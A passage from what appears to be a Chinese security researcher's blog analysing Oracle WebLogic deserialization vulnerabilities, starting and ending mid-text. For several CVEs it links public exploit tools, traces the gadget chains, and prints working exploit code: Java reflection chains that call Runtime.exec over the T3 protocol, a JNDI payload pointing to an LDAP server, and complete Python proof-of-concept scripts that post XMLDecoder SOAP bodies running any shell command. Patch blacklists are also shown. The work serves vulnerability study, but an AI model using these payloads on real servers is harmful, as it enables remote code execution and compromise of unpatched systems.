href="https://paper.seebug.org/718/">CVE-2018-3191</a>就已经被挖掘出来，当时修复的时候是<code>JtaTransactionManager</code>的父类<code>AbstractPlatformTransactionManager</code>加入到了黑名单列表，T3协议使用的是<code>resolveClass</code>方法进行过滤，<code>resolveClass</code>方法是会读取父类的，但是IIOP协议就不会去读取父类导致我们可以绕过黑名单，触发JNDI注入。</p><p>下面是exploit的核心部分</p><pre><code class="java">// 创建jndi的contextHashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;();env.put(&quot;java.naming.factory.initial&quot;, &quot;weblogic.jndi.WLInitialContextFactory&quot;);env.put(&quot;java.naming.provider.url&quot;, rhost);Context context = new InitialContext(env);// payloadJtaTransactionManager jtaTransactionManager = new JtaTransactionManager();jtaTransactionManager.setUserTransactionName(rmiurl);// 代理类封装并绑定Remote remote = createMemoitizedProxy(createMap(&quot;Foo&quot;, jtaTransactionManager), Remote.class);context.rebind(&quot;Foo&quot;), remote);</code></pre><p><strong>补丁</strong></p><p>据说是直接封禁IIOP协议？</p><h4 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h4><blockquote><p>Oracle Coherence 3.7.1.17、12.1.3.0、12.2.1.3、12.2.1.4</p><p>需要注意的虽然Weblogic 10.3.6.0自带Oracle Coherence 3.7，但是它默认未启用Coherence，所以不在影响范围之内</p></blockquote><p><strong>工具利用</strong></p><p><a href="https://github.com/Y4er/CVE-2020-2555.git">https://github.com/Y4er/CVE-2020-2555.git</a></p><p><strong>漏洞分析</strong></p><p>漏洞入口在<code>coherence.jar</code>的<code>LimitFilter</code>类的<code>toString()</code>方法中，而<code>BadAttributeValueExpException</code>这个类可以调用任何类（val）的<code>toString()</code>方法，只要控制<code>setSecurityManager</code>为<code>null</code>即可，所以我们利用它来封装我们的恶意对象</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271437bc0b762a1921e1de3106.png" alt="image-20210127123724776"></p><p>在<code>toString()</code>方法中，提取<code>m_comparator</code>的值作为ValueExtractor，再对<code>m_oAnchorTop</code>和<code>m_oAnchorBottom</code>调用<code>extract()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714373cd6a3047dec16ffcc82.png" alt="image-20210127131228572"></p><p>进入<code>extract()</code>，它是创建一个的aExtractor，并递归调用<code>extract()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714378d6a778ed7c269d93054.png" alt="image-20210127131851693"></p><p><code>getExtractors()</code>返回的是<code>m_aExtractor</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714371dcf8ddf74226cda2ecc.png" alt="image-20210127131908064"></p><p>内部的<code>extract()</code>就是利用反射机制返回方法调用，方法名和参数都可以空，所以只要构成一条extract chain就可以实现任意代码执行了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271437e11ca574d1a166db1591.png" alt="image-20210127132406861"></p><p>exploit核心部分</p><pre><code class="java">public static void main(String[] args) throws Exception &#123;    // 构造反射连    ReflectionExtractor extractor1 = new ReflectionExtractor(        &quot;getMethod&quot;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;    );    ReflectionExtractor extractor2 = new ReflectionExtractor(        &quot;invoke&quot;, new Object[]&#123;null, new Object[0]&#125;    );    ReflectionExtractor extractor3 = new ReflectionExtractor(        &quot;exec&quot;, new Object[]&#123;new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;touch /tmp/success&quot;&#125;&#125;    );    ReflectionExtractor[] extractors = &#123;        extractor1,        extractor2,        extractor3,    &#125;;    // 创建LimitFilter实例    ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);    LimitFilter limitFilter = new LimitFilter();    // 设置limitFilter的m_comparator属性    Field m_comparator = limitFilter.getClass().getDeclaredField(&quot;m_comparator&quot;);    m_comparator.setAccessible(true);    m_comparator.set(limitFilter, chainedExtractor);    // 设置limitFilter的m_oAnchorTop属性    Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(&quot;m_oAnchorTop&quot;);    m_oAnchorTop.setAccessible(true);    m_oAnchorTop.set(limitFilter, Runtime.class);    // 设置BadAttributeValueExpException的val属性    BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);    Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);    field.setAccessible(true);    field.set(badAttributeValueExpException, limitFilter);    // 序列化并发送payload    byte[] payload = Serializables.serialize(badAttributeValueExpException);    T3ProtocolOperation.send(&quot;127.0.0.1&quot;, &quot;7001&quot;, payload);&#125;</code></pre><p><strong>补丁</strong></p><p>这里借一下别人的图，修复的方式特别有趣，把整个把<code>LimitFilter</code>类的<code>toString()</code>方法中的全部extractor去掉了</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127143734f9c7c3a6c91d0db4a5.png" alt="image-20210127100406491" style="zoom:67%;" /><h4 id="CVE-2020-2883"><a href="#CVE-2020-2883" class="headerlink" title="CVE-2020-2883"></a>CVE-2020-2883</h4><blockquote><p>WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0</p></blockquote><p><strong>工具利用</strong></p><p><a href="https://github.com/Y4er/CVE-2020-2883">https://github.com/Y4er/CVE-2020-2883</a></p><p><strong>漏洞分析</strong></p><p>此漏洞是对CVE-2020-2555补丁的绕过，因为<code>LimitFilter</code>被禁了，所以我们需要找其他在内部调用了<code>extract()</code>方法的函数，<code>java.util.PriorityQueue.readObject()</code>就是其中一个，我们跟进<code>heapify()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714375b7d2845c7978cadf80b.png" alt="image-20210127134622640"></p><p>递归调用<code>siftDown()</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271438502ed1d21c0123b3c682.png" alt="image-20210127134703950"></p><p>如果<code>comparator</code>非空，即如果我们自己定义比较器，就调用<code>siftDownUsingComparator()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714386d889120abe5f2902c96.png" alt="image-20210127134828845"></p><p>然后在我们的comparator调用<code>compare()</code>方法时</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127143840af1a57fa0cdac84aff.png" alt="image-20210127135716314"></p><p>在里面也调用了<code>extract()</code>方法，后面就和CVE-2020-2555类似了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127143840af1a57fa0cdac84aff.png" alt="image-20210127141737892"></p><p>exploit核心代码</p><pre><code class="java">public static void main(String[] args) throws Exception &#123;    // 构造反射链    ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor(&quot;getMethod&quot;, new Object[]&#123;&quot;getRuntime&quot;, new Class[]&#123;&#125;&#125;);    ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor(&quot;invoke&quot;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;);    ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor(&quot;exec&quot;, new Object[]&#123;new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;touch /tmp/success&quot;&#125;&#125;);    ValueExtractor[] valueExtractors = new ValueExtractor[]&#123;        reflectionExtractor1,        reflectionExtractor2,        reflectionExtractor3,    &#125;;    // 创建ChainedExtractor实例    ReflectionExtractor reflectionExtractor = new ReflectionExtractor(&quot;toString&quot;, new Object[]&#123;&#125;);    ValueExtractor[] valueExtractors1 = new ValueExtractor[]&#123; reflectionExtractor &#125;;    ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);    // 创建PriorityQueue，并使用自定义的chainedExtractor    PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));    queue.add(&quot;1&quot;);    queue.add(&quot;1&quot;);    // 设置m_aExtractor属性    Class clazz = ChainedExtractor.class.getSuperclass();    Field m_aExtractor = clazz.getDeclaredField(&quot;m_aExtractor&quot;);    m_aExtractor.setAccessible(true);    m_aExtractor.set(chainedExtractor1, valueExtractors);    // 序列化并发送payload    byte[] payload = Serializables.serialize(queue);    T3ProtocolOperation.send(&quot;127.0.0.1&quot;, &quot;7001&quot;, payload);&#125;</code></pre><p><strong>补丁</strong></p><p>将存在类似上面操作的<code>extract()</code> 方法的<code>MvelExtractor</code>和<code>ReflectionExtractor</code> 两个类加入到了黑名单中</p><h4 id="CVE-2020-14644"><a href="#CVE-2020-14644" class="headerlink" title="CVE-2020-14644"></a>CVE-2020-14644</h4><blockquote><p>Oracle WebLogic Server 12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p></blockquote><p><strong>工具利用</strong></p><p><a href="https://github.com/potats0/cve_2020_14644">https://github.com/potats0/cve_2020_14644</a></p><blockquote><p>坑：注意打包成jar的时候把jar文件分开放，不然会有其他jar文件的输出信息</p></blockquote><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021358b9e10947ecdee548a535.png" alt="image-20210129234101716"></p><p><strong>漏洞分析</strong></p><p>这是一条全新的gadget，漏洞入口点在<code>coherence.jar</code>中的<code>com.tangosol.internal.util.invoke.RemoteConstructor</code>，当反序列化类定义了<code>readResolve()</code>方法时，会在<code>readObject()</code>之后被调用</p><p>首先我们得知道，如果变量被<code>transient</code>和<code>static</code>修饰的话是不参与序列化和反序列化的，比如下面的<code>m_serializer</code>和<code>m_loader</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202135955524e1a6690fa3d0c29.png" alt="image-20210130120113315"></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021359a7b05e8757eadb957aab.png" alt="image-20210130115655500"></p><p><code>newInstance()</code>如下<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021400756c4a2b55c1afe83845.png" alt="image-20210130115853118"></p><p><code>getClassLoader()</code>中因为<code>m_loader</code>为空（原因上面提到），所以调用<code>getContextClassLoader()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021400a03df57402b076eb10f3.png" alt="image-20210130115954423"></p><p>在<code>realize()</code>方法调用如下</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021400462dfef75783cc2032c3.png" alt="image-20210130130218731"></p><p><code>getDefinition()</code>返回的是我们的<code>m_definition</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401a32f3723ecc6d3da1ebd.png" alt="image-20210130125805171"></p><p>然后是调用了<code>definition</code>的<code>getRemotableClass()</code>方法，返回的是<code>m_clz</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401a6e85ebadc3407627149.png" alt="image-20210130130001177"></p><p>但是它也是被<code>transient</code>修饰的，所以返回的也是空</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401d9c44b4992aeefa34844.png" alt="image-20210130130045856"></p><p>所以下面我们会调用<code>defineClass()</code>去加载我们的<code>definition</code>，这里就可以自己实例化一个自定义类了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401db235884b695c3092387.png" alt="image-20210130130456664"></p><p>相关方法的返回如下</p><pre><code class="java">    public ClassIdentity getId() &#123;        return this.m_id;    &#125;    // 包名和方法名用`/`隔开    public String getName() &#123;        return this.getPackage() + &quot;/&quot; + this.getSimpleName();    &#125;    public String getPackage() &#123;        return this.m_sPackage;    &#125;        // 方法名和版本号用`$`隔开    public String getSimpleName() &#123;        return this.getBaseName() + &quot;$&quot; + this.getVersion();    &#125;    public String getBaseName() &#123;        return this.m_sBaseName;    &#125;    public String getVersion() &#123;        return this.m_sVersion;    &#125;</code></pre><p>在后面还会对包名进行检测</p><pre><code class="java">    private ProtectionDomain preDefineClass(String var1, ProtectionDomain var2) &#123;        if (!this.checkName(var1)) &#123;            throw new NoClassDefFoundError(&quot;IllegalName: &quot; + var1);        &#125; else if (var1 != null &amp;&amp; var1.startsWith(&quot;java.&quot;)) &#123;            throw new SecurityException(&quot;Prohibited package name: &quot; + var1.substring(0, var1.lastIndexOf(46)));        &#125; else &#123;            if (var2 == null) &#123;                var2 = this.defaultDomain;            &#125;            if (var1 != null) &#123;                this.checkCerts(var1, var2.getCodeSource());            &#125;            return var2;        &#125;    &#125;    // 检查包名    private boolean checkName(String var1) &#123;        if (var1 != null &amp;&amp; var1.length() != 0) &#123;            return var1.indexOf(47) == -1 &amp;&amp; (VM.allowArraySyntax() || var1.charAt(0) != &#39;[&#39;);        &#125; else &#123;            return true;        &#125;    &#125;</code></pre><p>所以exploit可以这么编写</p><pre><code class="java">// 实例化一个ClassIdentityClassIdentity classIdentity = new ClassIdentity(test.class);// ClassPool是CtClass实例的容器ClassPool cp = ClassPool.getDefault();// CtClass表示一个class文件，以字节码方式存储CtClass ctClass = cp.get(test.class.getName());// 添加version规范类名ctClass.replaceClassName(test.class.getName(), test.class.getName() + &quot;$&quot; + classIdentity.getVersion());// 使用RemoteConstructor类封装RemoteConstructor constructor = new RemoteConstructor(new ClassDefinition(classIdentity, ctClass.toBytecode()), new Object[0]);</code></pre><p><strong>补丁</strong></p><p>未知</p><h4 id="CVE-2020-14645"><a href="#CVE-2020-14645" class="headerlink" title="CVE-2020-14645"></a>CVE-2020-14645</h4><blockquote><p>Oracle WebLogic Server 12.2.1.4.0</p><p>因为此构造链子用到了<code>UniversalExtractor</code>类，而这个类是Weblogic 12.2.1.4.0独有的，所以只能影响这个版本</p></blockquote><p><strong>工具利用</strong></p><p>在<code>weblogic_cmd.jar</code>上修改</p><p><a href="https://github.com/Y4er/CVE-2020-14645">https://github.com/Y4er/CVE-2020-14645</a></p><p><strong>漏洞分析</strong></p><p>此漏洞是对CVE-2020-2883的补丁绕过，在CVE-2020-2883把<code>ReflectionExtractor</code>类加入到黑名单，我们可以用<code>UniversalExtractor</code>类去进行构造</p><p>依旧是来到之前自定义的比较器，这次我们调用的是<code>UniversalExtractor</code>类的<code>extractor</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021402cab665089beeb289fc12.png" alt="image-20210130141130883"></p><p>因为<code>oTarget</code>和<code>targetPrev</code>不相等，所以调用<code>extractComplex()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020214038c48020886f649cc2084.png" alt="image-20210130141158447"></p><p><code>extractComplex()</code>方法具体调用如下</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021403f906fc7d8ec46927ab7d.png" alt="image-20210130141530634"></p><p>这里我们要令<code>clzParam</code>为空（原因在下），查看<code>getClassArry()</code>方法，只要令传入的<code>m_aoParam</code>为空即可</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021403182d049a76551a629993.png" alt="image-20210130143626948"></p><p>然后来到<code>getCanonicalName()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021407274effe8c9bf6cda9c08.png" alt="image-20210130144532283"></p><p>进入<code>getValueExtractorCanonicalName()</code>方法，获取lambda的方法名，再放入到<code>computeValueExtractorCanonicalName()</code>调用，其实就是提取出<code>.getKey().databaseMetaData</code>的后半部分，即最后返回的<code>sCName</code>为<code>databaseMetaData</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140467bd62ac3f4bb46c692c.png" alt="image-20210130144653254"></p><p><code>isPropertyExtractor()</code>返回<code>!m_fMethod</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020214071b18a1316fc7eab787db.png" alt="image-20210130141922042"></p><p>我们看看<code>m_fMethod</code>的定义，因为<code>m_fMethod</code>被<code>transient</code>修饰，所以<code>fProperty</code>只能为true</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140432f8cbc611eb7fd1ca1b.png" alt="image-20210130143857296"></p><p>如果<code>fProperty</code>为true，就会去调用<code>ClassHelper.findMethod()</code>方法，其中<code>BEAN_ACCESSOR_PREFIXES</code>如下，所以说我们可以调用到任意的<code>get、is</code>的方法，这里是漏洞利用的关键点，在该测试中，我们调用的关键方法为<code>getDatabaseMetaData()</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021405b1f8225d79e1aaa35a03.png" alt="image-20210130142347926"></p><p>令<code>cParams</code>为空，即令上面提到的<code>clzParam</code>为空，<code>fExactMatch</code>就会一直为true，如果<code>fExactMatch &amp;&amp; !fStatic</code>为true，就回去调用<code>getMethod()</code>方法，这样就能顺利返回方法调用</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021405957f92e7dcdfb9a598ff.png" alt="image-20210130142813607"></p><p>之后就是调用<code>getDatabaseMetaData</code>的<code>invoke()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020214067dcd1f4de020641c89d1.png" alt="image-20210130145752528"></p><p>持续跟进，我们可以看到调用了<code>getDatabaseMetaData</code>的<code>connect()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140620de56c99f0a1bde7e27.png" alt="image-20210130145845091"></p><p>在里面我们就会看到<code>lookup()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140786a4ea00a352dc2ca03d.png" alt="image-20210130145911420"></p><p>JNDI的地址就是我们的<code>dataSource</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021407d547627a020518b77053.png" alt="image-20210130150003790"></p><p>所以exploit的编写如下</p><pre><code class="java">// 创建ExtractorComparator实例UniversalExtractor extractor = new UniversalExtractor(&quot;getDatabaseMetaData()&quot;, null, 1);final ExtractorComparator comparator = new ExtractorComparator(extractor);// 创建JdbcRowSetImpl实例JdbcRowSetImpl rowSet = new JdbcRowSetImpl();rowSet.setDataSourceName(&quot;ldap://172.20.0.2:1089/#exp&quot;);// 创建PriorityQueue实例，并使用自定义比较器final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);Object[] q = new Object[]&#123;rowSet, rowSet&#125;;Reflections.setFieldValue(queue, &quot;queue&quot;, q);Reflections.setFieldValue(queue, &quot;size&quot;, 2);// 序列化并发送payloadbyte[] payload = Serializables.serialize(queue);T3ProtocolOperation.send(&quot;172.20.0.2&quot;, &quot;7001&quot;, payload);</code></pre><p><strong>补丁</strong></p><p>未知</p><h3 id="XML反序列化"><a href="#XML反序列化" class="headerlink" title="XML反序列化"></a>XML反序列化</h3><h4 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h4><blockquote><p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.0、12.2.1.1、12.2.1.2</p></blockquote><p><strong>poc</strong></p><pre><code class="python">import requestsimport reimport sysheaders = &#123; &#39;Content-Type&#39;:&#39;text/xml&#39; &#125;proxies = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;&#125;def poc(url, cmd):    url = &#39;%s/wls-wsat/CoordinatorPortType&#39; % url    data = &#39;&#39;&#39;    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;      &lt;soapenv:Header&gt;        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;          &lt;java&gt;            &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;              &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;                &lt;void index=&quot;0&quot;&gt;                  &lt;string&gt;/bin/bash&lt;/string&gt;                &lt;/void&gt;                &lt;void index=&quot;1&quot;&gt;                  &lt;string&gt;-c&lt;/string&gt;                &lt;/void&gt;                &lt;void index=&quot;2&quot;&gt;                  &lt;string&gt;%s&lt;/string&gt;                &lt;/void&gt;              &lt;/array&gt;              &lt;void method=&quot;start&quot;/&gt;            &lt;/object&gt;          &lt;/java&gt;        &lt;/work:WorkContext&gt;      &lt;/soapenv:Header&gt;      &lt;soapenv:Body/&gt;    &lt;/soapenv:Envelope&gt;    &#39;&#39;&#39; % cmd    try:        response = requests.post(url, headers=headers, data=data, verify=False, timeout=5, proxies=proxies)        response = response.text        response = re.search(r&quot;\&lt;faultstring\&gt;.*\&lt;\/faultstring\&gt;&quot;, response).group(0)    except Exception as e:        response = &quot;&quot;    if &#39;&lt;faultstring&gt;java.lang.ProcessBuilder&#39; in response or &quot;&lt;faultstring&gt;0&quot; in response:        result = &quot;test ok&quot;        return result    else:        result = &quot;No Vulnerability&quot;        return resultif __name__ == &#39;__main__&#39;:    if len(sys.argv) &lt; 3:        print(&quot;python poc.py http://127.0.0.1:7001 touch /tmp/success&quot;)        sys.exit(0)    else:        ip = sys.argv[1]        cmd = &#39; &#39;.join(sys.argv[2:])        print(cmd)        print(poc(ip, cmd))</code></pre><p><strong>漏洞分析</strong></p><p>这个漏洞是构造SOAP（XML）格式的请求触发XMLDecoder的反序列化，把漏洞入口定位在<code>WorkContextServerTube</code>类中的<code>processRequest()</code>方法，<code>var1</code>为我们传入的SOAP请求，它会写到<code>var3</code>中并调用了<code>readHeaderOld()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714384fc665e776134ef9a962.png" alt="image-20210125172658998"></p><p>跟进去我们会发现它被传入到了<code>WorkContextXmlInputAdapter</code>类的构造函数中，这个地方就是漏洞的关键，说明我们对任意XML进行反序列化</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714380d533c96064eb3bf975e.png" alt="image-20210125173128468"></p><p>跟进这个类，可以发现它直接被带入了<code>XMLDecoder()</code>构造函数</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714392d61ea0a8a3658ce1bb8.png" alt="image-20210125173246975"></p><p>跳出来跟进<code>receive()</code>方法，就是处理拿到的XML数据，持续跟进就能看到它调用了<code>readObject()</code>方法进行反序列化</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271439f774ef60ae7c51d371db.png" alt="image-20210125174531750"></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271439cdce681dad871d89c2e2.png" alt="image-20210125174545079"></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714398ed563a56218a3998d96.png" alt="image-20210125174303357"></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271439ab41b28324fe6397a843.png" alt="image-20210125174632414"></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271440713e032701c41d85a687.png" alt="image-20210125174415289"></p><p><strong>补丁</strong></p><p>找了网上别人的补丁主要代码，也是采用黑名单机制</p><pre><code class="java">private void validate(InputStream is) &#123;    WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();    try &#123;        SAXParser parser = factory.newSAXParser();        parser.parse(is, new DefaultHandler() &#123;            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;                if (qName.equalsIgnoreCase(&quot;object&quot;)) &#123;                    throw newIllegalStateException(&quot;Invalid context type: object&quot;);                &#125;            &#125;        &#125;);    &#125; catch(ParserConfigurationException var5) &#123;        throw new IllegalStateException(&quot;Parser Exception&quot;, var5);    &#125; catch(SAXException var6) &#123;        throw new IllegalStateException(&quot;Parser Exception&quot;, var6);    &#125; catch(IOException var7) &#123;        throw new IllegalStateException(&quot;Parser Exception&quot;, var7);    &#125;&#125;</code></pre><p>可以看到它只是禁止了<code>qName</code>为<code>object</code>类而已，所以很快就出现了下面CVE-2017-10271的绕过</p><h4 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h4><blockquote><p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2</p></blockquote><p><strong>poc</strong></p><pre><code class="python">import requestsimport reimport sysheaders = &#123;&#39;Content-Type&#39;:&#39;text/xml&#39;&#125;proxies = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;&#125;def poc(url, cmd):    url = &#39;%s/wls-wsat/CoordinatorPortType&#39; % url    data = &#39;&#39;&#39;    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;      &lt;soapenv:Header&gt;        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;          &lt;java&gt;            &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;              &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;                &lt;void index=&quot;0&quot;&gt;                  &lt;string&gt;/bin/bash&lt;/string&gt;                &lt;/void&gt;                &lt;void index=&quot;1&quot;&gt;                  &lt;string&gt;-c&lt;/string&gt;                &lt;/void&gt;                &lt;void index=&quot;2&quot;&gt;                  &lt;string&gt;%s&lt;/string&gt;                &lt;/void&gt;              &lt;/array&gt;              &lt;void method=&quot;start&quot;/&gt;            &lt;/void&gt;          &lt;/java&gt;        &lt;/work:WorkContext&gt;      &lt;/soapenv:Header&gt;      &lt;soapenv:Body/&gt;    &lt;/soapenv:Envelope&gt;    &#39;&#39;&#39; % cmd    try:        response = requests.post(url, headers=headers, data=data, verify=False, timeout=5)        response = response.text        response = re.search(r&quot;\&lt;faultstring\&gt;.*\&lt;\/faultstring\&gt;&quot;, response).group(0)    except Exception as e:        response = &quot;&quot;        print(&#39;[*]&#39;, e)    if &#39;&lt;faultstring&gt;java.lang.ProcessBuilder&#39; in response or &quot;&lt;faultstring&gt;0&quot; in response:        result = &quot;[+] test ok&quot;        return result    else:        result = &quot;[*] No Vulnerability&quot;        return resultif __name__ == &#39;__main__&#39;:    if len(sys.argv) &lt; 3:        print(&quot;python poc.py http://127.0.0.1:7001 touch /tmp/success&quot;)        sys.exit(0)    else:        ip = sys.argv[1]        cmd = &#39; &#39;.join(sys.argv[2:])        print(&#39;[*] send payload:&#39;, cmd)        print(poc(ip, cmd))</code></pre><p>此外还有<code>new</code>标签也可以利用</p><blockquote><p>注意jdk6不支持<code>new</code>等标签</p></blockquote><pre><code class="java">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;    &lt;new class=&quot;java.lang.ProcessBuilder&quot;&gt;        &lt;string&gt;calc&lt;/string&gt;        &lt;method name=&quot;start&quot;/&gt;    &lt;/new&gt;&lt;/java&gt;</code></pre><p><strong>漏洞分析</strong></p><p>因为和CVE-2017-3506几乎一样，这里就不分析了，其实就是把<code>object</code>标签更改为其他可用的，比如<code>void</code></p><p><strong>补丁</strong></p><p>对涉及到的<code>object、new、method、void、array</code>类型都进行了检测</p><pre><code class="java">private void validate(InputStream is) &#123;    WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();    try &#123;        SAXParser parser = factory.newSAXParser();        parser.parse(is, new DefaultHandler()) &#123;            private int overallarraylength = 0;            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXEception &#123;                if (qName.equalsIgnoreCase(&quot;object&quot;)) &#123;                    throw new IllegalStateException(&quot;Invalid element qName:object&quot;);                &#125; else if (qName.equalsIgnoreCase(&quot;new&quot;)) &#123;                    throw new IllegalStateException(&quot;Invalid element qName:new&quot;);                &#125; else if (qName.equalsIgnoreCase(&quot;method&quot;)) &#123;                    throw new IllegalStateException(&quot;Invalid element qName:method&quot;);                &#125; else &#123;                    if (qName.equalsIgnoreCase(&quot;void&quot;)) &#123;                        for (int attClass = 0;attClass &lt; attributes.getLength(); ++attClass) &#123;                            if (!&quot;index&quot;.equalsIgnoreCase(attributes.getQName(attClass))) &#123;                                throw new IllegalStateException(&quot;Invalid attribute for element void: &quot; + attributes.getQName(attClass));                            &#125;                        &#125;                    &#125;                    if (qName.equalsIgnoreCase(&quot;array&quot;)) &#123;                        String var9 = attributes.getValue(&quot;class&quot;);                        if (var9 != null &amp;&amp; !var9.equalsIgnoreCase(&quot;byte&quot;)) &#123;                            throw new IllegalStateException(&quot;The value of class attribute is not valid for array element.&quot;);                        &#125;                    &#125;                    ......                &#125;            &#125;        &#125;    &#125;&#125;</code></pre><h4 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h4><blockquote><p>Oracle WebLogic Server 